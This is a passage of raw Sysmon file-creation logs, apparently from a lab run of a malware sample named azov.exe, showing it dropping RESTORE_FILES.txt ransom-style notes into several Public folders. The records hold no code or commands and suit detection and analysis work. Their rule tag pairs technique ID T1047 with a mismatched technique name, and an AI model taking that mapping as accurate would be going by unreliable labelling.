13:46:57.654","User":"serhatg.local\\user","EventReceivedTime":1672667217,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:57 serhatg.local Microsoft-Windows-Sysmon[3052]: {"EventTime":1672667217,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":6080,"ProcessID":3052,"ThreadID":3724,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: technique_id=T1047,technique_name=File System Permissions Weakness\r\nUtcTime: 2023-01-02 13:46:57.654\r\nProcessGuid: {0d99170d-1622-6375-1a01-000000001100}\r\nProcessId: 7828\r\nImage: C:\\Users\\user\\Desktop\\azov.exe\r\nTargetFilename: C:\\Users\\Public\\Libraries\\RESTORE_FILES.txt\r\nCreationUtcTime: 2023-01-02 13:46:57.654\r\nUser: serhatg.local\\user","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"technique_id=T1047,technique_name=File System Permissions Weakness","UtcTime":"2023-01-02 13:46:57.654","ProcessGuid":"{0d99170d-1622-6375-1a01-000000001100}","Image":"C:\\Users\\user\\Desktop\\azov.exe","TargetFilename":"C:\\Users\\Public\\Libraries\\RESTORE_FILES.txt","CreationUtcTime":"2023-01-02 13:46:57.654","User":"serhatg.local\\user","EventReceivedTime":1672667217,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:57 serhatg.local Microsoft-Windows-Sysmon[3052]: {"EventTime":1672667217,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":6077,"ProcessID":3052,"ThreadID":3724,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: technique_id=T1047,technique_name=File System Permissions Weakness\r\nUtcTime: 2023-01-02 13:46:57.638\r\nProcessGuid: {0d99170d-1622-6375-1a01-000000001100}\r\nProcessId: 7828\r\nImage: C:\\Users\\user\\Desktop\\azov.exe\r\nTargetFilename: C:\\Users\\Public\\Downloads\\RESTORE_FILES.txt\r\nCreationUtcTime: 2023-01-02 13:46:57.638\r\nUser: serhatg.local\\user","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"technique_id=T1047,technique_name=File System Permissions Weakness","UtcTime":"2023-01-02 13:46:57.638","ProcessGuid":"{0d99170d-1622-6375-1a01-000000001100}","Image":"C:\\Users\\user\\Desktop\\azov.exe","TargetFilename":"C:\\Users\\Public\\Downloads\\RESTORE_FILES.txt","CreationUtcTime":"2023-01-02 13:46:57.638","User":"serhatg.local\\user","EventReceivedTime":1672667217,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:57 serhatg.local Microsoft-Windows-Sysmon[3052]: {"EventTime":1672667217,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":6078,"ProcessID":3052,"ThreadID":3724,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: technique_id=T1047,technique_name=File System Permissions Weakness\r\nUtcTime: 2023-01-02 13:46:57.638\r\nProcessGuid: {0d99170d-1622-6375-1a01-000000001100}\r\nProcessId: 7828\r\nImage: C:\\Users\\user\\Desktop\\azov.exe\r\nTargetFilename: C:\\Users\\Public\\Documents\\RESTORE_FILES.txt\r\nCreationUtcTime: 2023-01-02 13:46:57.638\r\nUser: serhatg.local\\user","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"technique_id=T1047,technique_name=File System Permissions Weakness","UtcTime":"2023-01-02 13:46:57.638","ProcessGuid":"{0d99170d-1622-6375-1a01-000000001100}","Image":"C:\\Users\\user\\Desktop\\azov.exe","TargetFilename":"C:\\Users\\Public\\Documents\\RESTORE_FILES.txt","CreationUtcTime":"2023-01-02 13:46:57.638","User":"serhatg.local\\user","EventReceivedTime":1672667217,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
